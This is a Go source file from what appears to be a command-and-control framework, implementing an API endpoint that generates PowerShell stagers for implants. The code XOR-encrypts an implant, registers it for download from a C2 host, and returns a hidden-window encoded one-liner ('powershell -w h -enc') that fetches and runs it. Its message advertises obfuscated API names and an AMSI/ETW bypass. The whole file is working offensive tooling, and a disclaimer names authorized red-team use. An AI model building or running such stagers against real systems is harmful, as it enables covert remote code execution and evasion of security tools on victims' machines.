package web

/*
	SUDOSOC-C2 — PowerShell Stager endpoint
	Copyright (C) 2026  sudosoc — Seif
	Authorized penetration testing and red team operations only.

	POST /api/generate/ps
	  body:  { binary_path, implant_name, is_shellcode, c2_host, c2_port }
	  resp:  { oneliner, ps1_path, stage_url, message }

	Delivery:
	  powershell -w h -enc <oneliner>
*/

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"path/filepath"
	"strings"

	"github.com/sudosoc/SUDOSOC-C2/server/generate"
)

type psReq struct {
	BinaryPath  string `json:"binary_path"`
	ImplantName string `json:"implant_name"`
	IsShellcode bool   `json:"is_shellcode"`
	C2Host      string `json:"c2_host"`
	C2Port      int    `json:"c2_port"`
}

type psResp struct {
	OneLiner string `json:"oneliner"`
	PS1Path  string `json:"ps1_path"`
	StageURL string `json:"stage_url"`
	Message  string `json:"message"`
}

func handleGeneratePS(w http.ResponseWriter, r *http.Request) {
	var req psReq
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.BinaryPath == "" {
		jsonError(w, "binary_path is required", http.StatusBadRequest)
		return
	}
	if req.C2Host == "" {
		jsonError(w, "c2_host is required", http.StatusBadRequest)
		return
	}
	if req.C2Port == 0 {
		req.C2Port = 8080
	}

	abs := filepath.Clean(req.BinaryPath)
	sliversDir := generate.GetSliversDir()
	if !strings.HasPrefix(abs, sliversDir) && !strings.HasPrefix(abs, "/tmp") {
		jsonError(w, "path not in allowed directories", http.StatusForbidden)
		return
	}

	// Read & encrypt the payload
	raw, err := os.ReadFile(abs)
	if err != nil {
		jsonError(w, "read payload: "+err.Error(), http.StatusInternalServerError)
		return
	}

	xorKey := make([]byte, 32)
	if _, err = generate.RandBytes(xorKey); err != nil {
		jsonError(w, "keygen: "+err.Error(), http.StatusInternalServerError)
		return
	}
	ct := make([]byte, len(raw))
	for i, b := range raw {
		ct[i] = b ^ xorKey[i%32]
	}

	stageID := generate.GenerateStageID()
	generate.RegisterStage(stageID, ct, xorKey)

	// Generate the PS stager
	b64, src, err := generate.PSBuildStager(stageID, req.C2Host, req.C2Port, xorKey)
	if err != nil {
		jsonError(w, "ps build: "+err.Error(), http.StatusInternalServerError)
		return
	}

	// Save the PS1 file
	name := req.ImplantName
	if name == "" {
		name = "implant"
	}
	destDir := filepath.Join(generate.GetSliversDir(), "windows", "amd64", name, "bin")
	os.MkdirAll(destDir, 0700)
	ps1Path := filepath.Join(destDir, name+".ps1")
	os.WriteFile(ps1Path, []byte(src), 0600)

	stageURL := fmt.Sprintf("http://%s:%d/api/stage/%s", req.C2Host, req.C2Port, stageID)

	_ = json.NewEncoder(w).Encode(psResp{
		OneLiner: "powershell -w h -enc " + b64,
		PS1Path:  ps1Path,
		StageURL: stageURL,
		Message: "Empire-style PS stager ready. " +
			"Unique variable names + XOR-obfuscated API names + AMSI/ETW bypass. " +
			"Run the one-liner on the target.",
	})
}
